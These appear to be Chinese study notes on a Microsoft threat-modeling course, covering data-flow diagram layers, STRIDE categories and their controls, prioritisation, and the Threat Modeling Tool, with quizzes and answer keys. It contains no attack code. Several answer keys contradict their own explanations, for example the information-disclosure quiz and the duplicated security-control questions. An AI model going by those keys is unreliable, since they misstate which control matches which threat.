服务名称”。 2 创建一个新文件，并完全按照描述标签为其命名。 3 仅将数据流关系图侧重于要“放大”的系统部分。 结果将获得过程层（称为第 1 层）中的一系列数据流关系图。 知识检查 第 0 层通常被称为什么？ A. 上下文层。 B. 过程层。 C. 子过程层。 参考答案：== A == 解释：A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。 第 1 层 - 过程层数据流关系图的过程层是第二层且应该用于大多数系统。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个系统部分。 目标：表示次要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与系统层相似，过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统部分的所有过程。 大多数数据流关系图都需要过程级别深度层才能进行正确评估。 何时使用过程层对每个系统都使用过程层，尤其是在处理敏感数据时。 具有敏感数据的系统遭受攻击的风险更高。 此级别的上下文可帮助你找出威胁以及更有效地降低或消除风险的方法。 深入了解系统部分在某些情况下，由于系统部分的敏感性和风险增加，可能需要更精细的上下文。 通过转到此层，可以更好地评估威胁和风险降低策略。 遵循系统层中的相同规则。 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“Web 服务工作进程名称”。 2 创建一个新文件，并完全按照描述标签为其命名，命名采用类似路径的结构，例如“Web 服务名称 - Web 服务工作进程名称”。 3 仅将数据流关系图侧重于要“放大”的系统子部分。 结果将获得子过程层（称为第 2 层）中的一系列数据流关系图。 类似路径的文件命名结构有助于区分不同的级别 知识检查 大多数应用程序属于哪一层？ A. 上下文层。 B. 过程层。 C. 子过程层。 参考答案：== B == 解释：A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。 第 2 层 - 子过程层数据流关系图子过程是第三层。 每当在创建高度敏感的系统时就应使用该层。 此层的数据流关系图包含单独的数据流关系图，这些关系图分别详细介绍每个系统子部分。 目标：表示系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。 请与你的团队核对以确认是否需要此深度级别。 何时使用子过程层将子过程层用于组织认为比较关键的系统。 系统子部分中的漏洞可能会使整个系统、客户和组织面临重大风险。 示例包括以下系统： 在安全环境中使用的系统 处理敏感数据的系统 具有高风险评分的系统 深入了解系统子部分任何需要更深入研究的系统子部分都应遵循过程层中的相同规则，并具有各自独立的数据流关系图。 通过较低级别的视图，用户可以“放大”和“缩小”系统，以展现尽可能多的上下文并达到更佳的清晰度。 方法如下： 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“输入分析程序名称”。 2 创建一个新文件，并使用与描述标签完全相同的名称为其命名，命名采用树状结构，例如“Web 服务名称 - Web 服务工作进程名称 - 输入分析程序名称”。 3 仅将数据流关系图侧重于要“放大”的较低级别的系统子部分。 结果将得到较低级别层（称为第 3 层）中的一系列数据流关系图。 类似路径的文件命名结构有助于区分不同的级别。 第 3 层 - 较低级别层低级别层是最后一层，应在创建内核级别系统或关键级别系统时使用。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个低级别系统子部分。 目标：表示低级别系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。 请与你的团队核对以确认是否需要此深度级别。 何时使用低级别层高度关键级别系统和内核级别的系统应在此层进行威胁建模。 数据流关系图应详细描述每个子过程。 此外，通常只为一个子过程进行多轮安全检查。 按照前面各层中的步骤操作，将每个关系图追溯到各自的系统部分。 小结摘要工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。 但是，根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。 在本模块中，你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。 本模块涵盖了以下内容： 了解了数据流关系图深度层之间的差异 了解了何时使用每个层 你知道吗？ 除了这四个层之外，你还可以根据用户角色创建关系图，以帮助找出身份验证和授权方面的缺陷。 据 OWASP 等信息源的报道，这些事故是目前各个组织面临的最大安全问题，因此，根据适用的角色应用威胁模型可以增强整个系统的安全性并帮助保护客户。 知识检查 以下哪条陈述概括了在威胁建模阶段提早定义上下文深度层的重要性 A. 这样我可以收集所有使用的外部组件的详细信息。 B. 这样做可以帮助我根据要求和期望生成恰当级别的上下文。 C. 这样做有助于在进行安全评审之前找出所有相关威胁。 参考答案：== B == 解释：A. 该陈述描述了设计阶段的一部分，但未定义上下文深度层的重要性。B. 此陈述阐明了在创建数据流关系图之前设置适当上下文级别的重要性。C. 此陈述描述了中断阶段的一部分，该阶段发生在创建数据流之后。 模块4 | 处理数据流关系图关注适当的威胁模型威胁建模是一种有效的技术，可帮助你确定威胁以及找到降低风险的方法。 你可以选择重点关注发现需要保护的方面或者攻击者在系统中的行为方式。 简介重点关注重要方面关注适当的方面可以帮助你定制威胁建模练习，以得出优秀的效果。 示例包括： 设计文件共享应用程序，并专注于保护其进程、数据存储和数据流。 设计文件共享应用程序，并专注于深入了解攻击者。 包括攻击者的动机以及可能用于攻击应用程序的方式 在此模块中，你将了解执行针对系统的威胁建模练习的含义。 还会了解针对系统、资产和攻击者的方法之间的大概差异。 学习目标在本模块中，你将能够： 定义针对系统的威胁建模练习 说明针对系统、资产和攻击者的方法之间的大概差异 无必备知识即可学习 （ 威胁建模针对性方法威胁建模是一种很好的技术，可帮助你在开发生命周期的更早阶段发现问题。 选择侧重点恰当的方法有助于定制威胁建模练习。 你可以发现更多可对其执行操作的威胁和解决威胁的方法。 侧重系统的方法目的是保护整个系统。 关注每个过程、数据存储、数据流、外部实体和信任边界。 利用此信息，可用选择安全控制措施来帮助保护系统。 此框架有助于分析系统及其对其他资产的影响，具体包括： 资产类型 示例 逻辑 源代码、API 和逻辑安全控制措施 物理 服务器和物理安全控制资产 侧重攻击者的方法你可以着眼于攻击者、其动机、方法，以及他们能够在系统中造成破坏的所有方式。 这种方法关注入口点，而不是整个系统。 使用此方法，你可以专注于包含系统高度机密数据的关键资产。 重点是保护这些资产，而不是整个系统。 侧重资产的方法评估每项资产的风险。 此方法基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。 Microsoft 工程师致力于保护系统。 渗透测试团队致力于保护系统和了解攻击者。 针对系统的和其他方面的方法侧重系统的方法的重要性使用 Azure 对用户进行身份验证是很好的做法。 了解它的工作原理，了解它是如何与系统的每个部分进行交互，可以更好地避免产生实现部署后的未知风险。 毕竟，威胁建模的目标是验证之前做出的假设，确定潜在的威胁，并在开发生命周期中更早地降低风险。 侧重系统的方法的实践示例 让我们以文件共享应用程序为例。 在这种情况下，查看数据流关系图时，可能会看到以下流： 用户请求访问应用程序 身份验证流启动 用户与其他用户共享文件 此方法分析并保护每个元素， 例如用户、Web 服务、身份验证服务、数据存储、Internet 与 Azure 之间的信任边界以及数据流。 针对系统的方法包含其他一些方法，但可能需要一一试用才能获得更精细的效果。 知识检查 针对系统的方法有什么好处？ A. 使用此方法，你可以一次专注一个关键资产，以帮助确定所有潜在威胁以及降低或消除风险的方法。 B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。 C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。 针对攻击者的方法有什么好处？ A. 使用此方法，你可以一次专注一个关键资产，以识别所有潜在威胁以及降低风险的方法。 B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。 C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。 参考答案： == C == == B == 解释： A. 此条目对应于针对资产的方法。B. 此条目对应于针对攻击者的方法。C. 针对系统的方法考察整个系统，而不仅仅是其中的某些部分。 A. 此条目对应于针对资产的方法。B. 针对攻击者的方法基于攻击者及其攻击计划。C. 此条目描述针对系统的方法。 小结威胁建模是一种有效的技术，可帮助你确定威胁以及降低或消除风险的方法。 你可以侧重于发现需要保护的方面或者攻击者在系统中的行为方式。 你了解了执行针对系统的威胁建模练习的含义。 还了解了针对系统、资产和攻击者的方法之间的差异。 在本模块中，你已经学习了以下内容： 定义了针对系统的威胁建模练习 说明了针对系统、资产和攻击者的方法之间的大概差异 模块5 | 使用框架识别威胁并找到减少或消除风险的方法介绍威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除风险的方法。 你只需具备信息安全方面的应用知识，框架就可为你列出威胁的主要类别，以确保它们得到适当的处理。 何时使用框架此框架应适用于为新系统或现有系统创建的每个数据流关系图。 目的是在开发生命周期的早期尽可能多地发现并修复问题。 等待时间越长，客户的风险就越高。 预期结果框架将为你呈现六个主要威胁类别，每个类别下有无数个潜在威胁。 通过该框架，你将能够回答以下问题： 通信的双方是否都通过了身份验证？ 如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？ 每个操作是否可以绑定到标识？ 如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？ 系统中是否存在资源受限的区域？ 如何得知某人可以执行此操作？ 在本模块中，你将了解每种威胁类别及其相应的安全控制。 学习目标在本模块中，你将能够： 讨论威胁建模框架中的每个威胁类别 了解有助于降低或消除风险的安全控制 无必备知识即可学习 （ 威胁建模框架威胁建模框架查看数据流关系图中的每个元素（包括它们的交互）。 这有助于发现潜在威胁和找到降低或消除风险的方式。 威胁类别Microsoft 工程师使用 STRIDE 框架中的六个主要威胁类别来发现安全设计问题： Category 说明 欺骗 冒充某人或某物 篡改 未经授权更改数据 否认性 不宣称对执行的操作负责 信息泄露 未经许可查看数据 拒绝服务 系统繁忙 权限提升 拥有本不应该拥有的权限 安全控制类别每个威胁类别都与安全控制关联，以帮助你降低或消除风险 类别 安全控制 描述 欺骗 身份验证 其身份是否如其所述 篡改 完整性 防止恶意修改数据 否认性 不可否认性 操作与用户绑定 信息泄露 机密性 保护数据免遭意外泄露 拒绝服务 可用性 系统适当处理所有请求 特权提升 授权 用户拥有执行请求的适当权限 我们在接下来的几个单元中来了解一下各种威胁类别。 欺骗 - 冒充某人或某物当恶意人员或程序成功地冒充用户或系统进行恶意活动时，就会发生欺骗。 示例包括： 攻击者通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限 攻击者欺骗 SSID 和 IP 地址，同时使用开放且原本不安全的 TCP/IP 协议向受害者发送恶意的有效负载 可能面临欺骗攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 外部实体 控制措施之外的过程、数据存储，甚至完全成熟的应用程序 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务从任务接收数据或向任务发送数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 过程 &lt;-&gt; 外部实体 一个任务向外部实体发送数据或从外部实体接收数据 如何防止欺骗攻击身份验证验证了用户和系统的身份是否属实。 示例包括： 发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性 使用 SSL/TLS 保护数据传输，以加密信息源和目标之间的流量 使用具有时效有限的令牌、密码或多重身份验证的唯一凭据来帮助保护用户、管理员和服务帐户 用于降低或消除风险的常用安全控制对于数据： 哈希 消息验证码 数字签名 对于系统： 用户身份验证 Cookie 身份验证 Kerberos SSL/TLS 证书 IPSec 数字签名的数据包 推荐问题：是否已验证通信双方的身份？ 知识检查 哪一条陈述描述了针对欺骗的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== A == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 篡改 - 未经授权更改数据当恶意攻击者未经授权在系统中读取、修改、删除或插入数据时，就会发生篡改。 示例包括： 修改临时存储在缓存中、通过网络发送或永久存储在数据库中的数据以破坏数据完整性 将恶意有效负载插入浏览器缓存中，以导致进程和数据存储中的行为异常 通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息 将数据重定向到被入侵的计算机以接管系统 诱使用户连接网络或下载文件，从而授予他们流量和设备访问权限（与欺骗结合使用） 可能面临篡改攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止篡改完整性防止恶意修改数据。 示例包括： 验证输入以防止处理恶意有效负载和错误处理意外行为 使用数字签名对消息进行签名，以确保消息不被篡改 使用访问控制列表应用权限 使用 SSL/TLS 保护传输 创建 IPSec 隧道，以保护终结点之间的通信 用于降低或消除风险的常用安全控制 操作系统完整性控制 访问控制列表 (ACL) 数字签名 消息验证码 推荐问题：如何得知某人无法更改传输中的数据或静态数据？ 知识检查 哪一条陈述描述了针对篡改的安全控制？ A. 发件人对电子邮件附件进行加密，以便让收件人知道电子邮件由何人所发。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== C == 解释：A. 加密附件是不够的。 对消息进行数字签名，以确保不会发生篡改。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 否认性 - 不宣称对执行的操作负责当有人出于恶意或无意采取某个操作，但声明其他操作时，就会发生否认性。 示例包括： 拒绝修改包含敏感操作的日志 使用其他人的帐户以避免被抓 声称没有删除数据库记录 系统日志是攻击者的金矿，不仅可用于操纵，而且可用于收集有关用户、环境和弱点的数据。 可能面临否认性攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 外部实体 控制措施之外的过程、数据存储，甚至完全成熟的应用程序 数据存储 永久或临时的数据存储 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务从任务接收数据或向任务发送数据 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 如何防止否认性攻击不可否认性通过创建和保护安全日志来确保每个操作都可以追溯到其来源。 用于降低或消除风险的常用安全控制 强身份验证 安全日志记录和监视 数字签名 安全时间戳 受信任的第三方 推荐问题：是否可以将每个操作与身份绑定？ 知识检查 哪一条陈述描述了针对否认性的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== B == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 信息泄漏 - 查看不应查看的数据向未经授权的个人公开敏感数据时，会发生信息泄漏。 无论是在有意或无意的情况下，都有可能发生信息泄露。 示例包括： 系统通过错误消息泄露敏感数据 用户访问安全控制较弱的未授权文档和文件夹 用户访问流经非安全网络的数据 可能面临信息泄漏风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止信息泄漏机密性确保数据受到保护。 示例包括： 应用访问控制列表，以确保合适的用户可以访问适当的数据 加密静态数据、传输中数据和正在使用的数据 强制实施 SSL/TLS 以保护传输 使用 IPSec 隧道保护跨终结点的通信 用于降低或消除风险的常用安全控制 加密 访问控制列表 (ACL) 推荐问题：是否可以确保没有人能查看我的传输中的数据和静态数据？ 知识检查 哪一条陈述描述了针对信息泄漏的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统为访问控制列表中列出的用户授予管理访问权限。 C. 系统记录所有操作和用户，明确每个人的责任。 参考答案：== A == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。C. 这条陈述适用于否认性。 拒绝服务 - 系统繁忙当攻击者导致系统不可用时，将发生拒绝服务。 示例包括： 向网络发送大量请求 占用内存和 CPU 进程 请求数量过多导致数据存储崩溃 可能面临拒绝服务风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止拒绝服务可用性确保系统为用户启动且正常运行。 示例包括： 使用网络访问控制列表控制传入和传出的流量 使用弹性资源管理不断增加或减少的使用量 监视系统以检测是否出现异常 启用操作系统标志来处理内存和 CPU 进程 用于降低或消除风险的常用安全控制 访问控制列表 (ACL) 筛选 配额 授权 高可用性 推荐问题：我的服务在某些地区是否会被限制资源？ 知识检查 哪一条陈述描述了针对拒绝服务的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统依靠弹性资源来处理接收到的更多请求。 参考答案：== C == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性C. 这条陈述适用于拒绝服务。 权限提升 - 拥有本不应该有用的权限个人未经许可访问资源时，就会发生权限提升。 示例包括： 利用输入处理逻辑或内存中的弱点来提取数据 查找并使用特权帐户破坏服务（与欺骗和篡改威胁结合使用） 可能面临权限提升 风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 任务接收来自用户的数据 过程 &lt;-&gt; 数据存储 任务接收来自数据存储的数据 如何防止权限提升授权确保用户拥有适当的权限。 示例包括： 实现授权机制以验证对数据和资源的权限 应用安全控制，以使用最少的访问权限运行服务 监视访问以检测异常和未经授权的访问尝试。 用于降低或消除风险的常用安全控制 访问控制列表 (ACL) 基于角色的访问控制 (RBAC) 基于组的访问 权限 输入验证 推荐问题：如何得知用户可以执行此操作？ 知识检查 哪一条陈述描述了针对权限提升的安全控制？ A. 系统使用尽可能少的权限运行进程。 B. 发送方对消息进行数字签名，以便接收方了解消息的来源。 C. 系统记录所有操作和用户，明确每个人的责任。 参考答案：== A == 解释：A. 这条陈述适用于权限提升。B. 此消息适用于欺骗。C. 这条陈述适用于否认性。 小结摘要威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除系统风险的方法。 了解每种威胁类别及其相应的安全控制。 本模块涵盖了以下内容： 讨论了威胁建模框架中的每种威胁类别 了解了有助于降低或消除风险的安全控制 你知道吗？ 可以使用许多其他框架来实现不同的目标。 例如，渗透测试团队可将 LINDDUN 用于隐私威胁和攻击树。 攻击树有助于通过“假定违规”思维来确定攻击可能发生的方式。 了解详细信息 LINDDUN - 一种隐私威胁建模方法，支持分析人员系统地查找和解决软件体系结构中的隐私威胁。 网络终止链 - 介绍典型的工作流，包括攻击者用于渗入组织网络和系统的技术、策略和过程。 补上一个微软安全博客 （ https://www.microsoft.com/security/blog/ 模块6 | 设置问题的优先级并应用安全控制措施介绍威胁建模框架可以帮助你生成威胁列表和降低风险的方法，但不会为你确定其优先级。 此外，它不会基于安全控制措施的类型和功能提供分层建议，因此更难确定要实现哪些控制措施。 确实问题的优先级确定问题的优先级是威胁建模中一个重要的部分。 在资源有限的情况下，它可以帮助将资源分配给最关键的问题。 示例包括： 必须选择是要实现记录所有管理操作的功能，还是使用 SSL/TLS 对流量进行加密 确定是先实现访问控制列表，还是先增强系统的输入验证过程 何时设置优先级根据每个问题的风险因素对其指定优先级。 此外，选择可与其他措施联用的安全控制措施，可帮助为你的系统提供分层安全保护机制。 此过程可能需要一段时间才能完成。 还需要同事和安全团队的帮助。 请留出足够的时间来与其协作。 学习目标在本模块中，你将能够： 对问题分配优先级 对安全控制进行分类 了解每个安全控制措施类型和功能 无必备知识即可学习 （ 问题优先级、安全控制措施类型和功能威胁建模练习可帮助你发现一些问题，有时还会有意想不到的收获。 缺少优先级可能会让工程师感到不知所措，无法确定要首先解决哪些问题。 方法首先，确定问题对于系统的重要程度。 然后，选择有利于以最低的成本提供最大程度保护的安全控制措施。 确定安全问题的优先级根据风险严重性来确定安全问题的优先级。 各组织的标签可能不同。 但通常会根据威胁被攻击者利用时带来的风险影响，以从严重到低风险的模式设置优先级标签。 类型和功能安全控制具有不同的类型和功能。 有三个主要的类别可帮助你关注安全性的三种形式。 示例包括： 物理：摄像头、徽章和围栏 技术：加密、虚拟防火墙和防病毒软件 管理：策略、法规和书面要求 功能的意义在于针对潜在威胁每个阶段帮助保护系统。 示例包括： 用锁防止入侵 安装摄像头来检测入侵 制定入侵响应计划 修复由入侵导致的破坏 使用标志和其他安全控制措施防患于未然 在接下来的几个单元中，我们将了解优先级、类型和功能。 设置安全问题的优先级生成包含降低或消除风险的方法的威胁列表。 然后，与同事合作分配优先级。 选择优先级框架优先级练习应遵循组织创建的内部安全 bug 栏。 Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考： Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考： 图标 严重性 说明 严重 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁 重要说明 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用 适中 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题 低 可能会对系统用户造成轻微影响 信息 已考虑、评估潜在威胁并认为它无关紧要 知识检查 可能会对用户造成严重影响的问题通常属于哪个优先级？ A. 重要说明。 B. 严重。 C. 适中。 参考答案：== A == 解释：A. 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用。B. 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁。C. 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题。 （Emmm 感觉 B 也行？ 安全控制措施类型和功能确定每个问题的优先级后，请查看安全控制措施列表，并选择对你的系统最有益的选项。 最有益的安全控制措施一般会跨多个 STRIDE 类别。 在大多数情况下，实现这些步骤的成本相对较低。 安全控制措施类型评估每项安全控制措施时，你会注意到它们属于以下类型之一： 图标 类型 说明 物理 此类控制措施从物理上阻止或检测未经授权的访问。 示例包括入口、徽章、摄像头、照明和抑制系统。 技术 此类控制措施从逻辑上保护系统。 示例包括防火墙、防病毒软件、访问控制列表和加密。 管理 此类控制措施指为系统定义流程的策略。 示例包括数据分类、审核和限制。 根据系统，你需要应用各种类型的安全控制措施，帮助建立多层保护以提升系统的安全性。 安全控制功能除了这三种主要类型外，安全控制还具有五个不同的功能，可帮助你应用多个安全层。 函数 说明 示例 预防 此策略是否有助于降低此威胁的概率或影响？ 锁定、防火墙、数据分类。 检测 此策略是否有助于识别所发生的系统攻击？ 监视、诱捕系统、审核日志。 纠正 此策略是否有助于控制如何响应传入攻击？ 物理修复、系统修补程序、事件响应计划。 恢复 此风险缓解措施是否有助于服务从攻击中恢复？ 热站点、系统备份、灾难恢复计划。 阻碍 此风险缓解措施是否有助于阻止攻击者访问系统？ 时限、最低权限、授权使用策略。 根据问题的优先级，可以考虑在系统被破坏之前、破坏过程中和破坏之后使用多项安全控制功能来保护它。 如何综合利用所有信息它们与安全控制措施类型共同形成一个矩阵，可帮助你做出正确的选择。 以下是一些示例： 功能 物理 逻辑 管理 预防 锁定 防火墙 数据分类 检测 监视 诱捕系统 审核日志 纠正 物理修复 系统修补程序 事件响应计划 恢复 热站点 系统备份 灾难恢复计划 阻碍 时限 最低权限 授权使用策略 知识检查 管理安全控制措施有什么示例？ A. 创建事件响应计划。 B. 安装新防火墙。 C. 在入口添加徽章扫描仪。 管理安全控制措施有什么示例？ A. 创建事件响应计划。 B. 安装新防火墙。 C. 在入口添加徽章扫描仪。 参考答案： == A == == C == 解释： A. 此条目适用于管理型安全控制措施。B. 此条目适用于逻辑型（可能还有物理型）安全控制措施。C. 此条目适用于物理型安全控制措施。 A. 此条目适用于预防性安全控制功能。B. 此条目适用于检测性安全控制功能。C. 此条目适用于矫正性安全控制功能。 小结威胁建模框架会为你提供威胁列表，并提供降低或消除风险的方法。 但是，它不会为你确定威胁的优先级。 此外，没有基于其类型和功能的分层安全控制建议。 你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。 在本模块中，你已经学习了以下内容： 了解了如何确定问题的优先级 分类安全控制 了解每个型安全控制措施和功能 模块7 | 使用推荐工具创建数据流图简介数据流关系图是系统工作方式的图形化表示形式。 这包括所有数据存储、进程、外部实体、信任边界和数据流。 如何创建数据流关系图你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 但是，确实需要了解威胁建模的原理，才能正确地对其进行分析。 某些应用程序提供的多种工具，它们可以通过威胁生成引擎和风险降低策略，帮助你创建数据流关系图。 其他工具仅提供创建数据流关系图的功能。 目标该学习路径的目标是让你了解威胁建模的基础知识，以便在任何地方、任何画布上进行威胁建模。 为了帮助你实现这个目标，我们会在介绍过程中推荐一些工具。 学习目标在本模块中，你将学习以下内容： 详细了解了 Threat Modeling Tool 详细了解 Visio 无必备知识即可学习 （ 建议的工具威胁建模将对你的数据流关系图应用一个框架，以帮助找到降低或消除风险的威胁和方法。 某些工具可帮助你创建数据流关系图，另一些还可以帮助你进行威胁生成练习。 根据你在威胁建模方面的专业水平，其中一些工具可能会很有帮助。 详细了解 Threat Modeling Tool在接下来的几个单元中，你将了解有关一些工具的详细信息： Threat Modeling Tool 提供多种工具，可用于创建数据流关系图并对其进行分析，以查找潜在威胁和风险降低策略 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio 提供了一个干净的画布，帮助你创建数据流关系图 Visio，（要钱的 打扰了 我们将在接下来的几个单元中进行介绍。 Threat Modeling ToolMicrosoft Threat Modeling Tool 由 Microsoft 发布，并获得威胁建模社区进行认可，可以帮助工程师创建数据流关系图并将 STRIDE 应用于其威胁建模工作。 Threat Modeling Tool 提供： 可自定义的模板 威胁生成引擎，其中包含威胁和风险降低策略 默认模板称为“SDL TM 知识库”，提供一组基本元素和威胁生成功能。 只要对数据流关系图和 STRIDE 有基本的了解即可使用。 STRIDE 回顾STRIDE 是六个主要威胁类别的首字母缩写： 欺骗 - 冒充某人或某物 篡改 - 未经授权更改数据 否认性 - 不宣称对执行的操作负责 信息泄露 - 在未获得权限的情况下查看数据 拒绝服务 - 使系统过载 权限提升 - 拥有本不应拥有的权限 高级用户部分对于更高级的用户，可以在三个主要部分对模板进行自定义。 模具进程、外部实体、数据存储、数据流和信任边界构成了父元素。 你还可以创建子元素，以帮助为其他上下文、可操作的威胁生成和风险降低策略提供粒度。 子元素的工作原理示例父元素提供了选择 HTTP 和 HTTPS 子元素的选项。 HTTP 应生成更多的威胁，因为篡改、信息泄露和欺骗威胁常见于未加密通道。 使用 HTTP 使用 HTTPS 如何添加元素属性如果有必须包括在默认模板中的其他属性，可以在管理员视图中将其添加到每个元素。 当用户将该元素拖放到画布上时，将看到自己的更改。 威胁属性使用属性可以创建为每个生成的威胁填充的字段，就像使用模具属性可以为每个元素创建字段一样。 请记住：目标是以最简单的方式获得尽可能多的上下文。 威胁属性的示例管理员视图 添加可为你提供更多上下文和可操作步骤的字段。 示例包括： 问题优先级 - 了解需要首先处理哪些问题 超链接 - 将问题链接到联机文档 外部风险映射 - 通过使用可靠的第三方源（如 OWASP Top 10 和 CWE 详细信息），使用与其他组织相同的语言来描述风险 啊这，超链接和外部风险在哪 （ 用户视图 Threat Modeling Tool 用户将在分析其数据流关系图时看到这些更改。 威胁和风险降低策略这一部分是 Threat Modeling Tool 的核心。 威胁生成引擎考察独立元素和已连接的元素，以确定生成哪个威胁。 威胁生成的原理步骤 1 - 指定源和目标威胁生成引擎使用简单的句子来生成威胁。 示例包括： 目标为[元素名称] 源为[元素名称] 你还可以在标题和说明中使用元素名称。 格式为：“{target.Name}”或“{source.Name}” 步骤 2 - 合并源和目标你可以精确规定如何生成威胁。 用 AND OR 运算符组合目标、源及其各个属性。 示例包括： target.[property name] is ‘Yes’ AND source.[property name] is ‘No’ 流交叉[信任边界名称] 步骤 3 - 生成或忽略威胁威胁生成引擎使用两个字段来生成或忽略威胁： Include - 如果在此字段中添加的句子为 true，则会生成威胁 Exclude - 如果在此字段中添加的句子为 true，则不会生成威胁 下面是默认模板的实际示例，以便将这些步骤结合在一起： 威胁： 跨站点脚本 Include: (target is [Web Server]) OR (target is [Web Application]) Exclude: (target.[Sanitizes Output] is ‘Yes’) AND (target.[Sanitizes Input] is ‘Yes’) 仅在以下情况时才会生成上述跨站点脚本威胁： 进程是 Web 服务器或 Web 应用程序 未净化输入和输出 Microsoft Threat Modeling Tool 模板创建 主题很复杂，本学习路径中不会进行充分讨论。 知识检查 Threat Modeling Tool 不提供哪些优势？ A. 生成的威胁基于整个关系图，而不仅是每个元素或每次交互。 B. 可以更改威胁、模具和模具属性。 C. 生成每个威胁时，都会包含降低或消除风险的方法。 参考答案：== A == 解释：A. 该工具仅考察各个元素和各次交互。B. 可以更改字段。C. 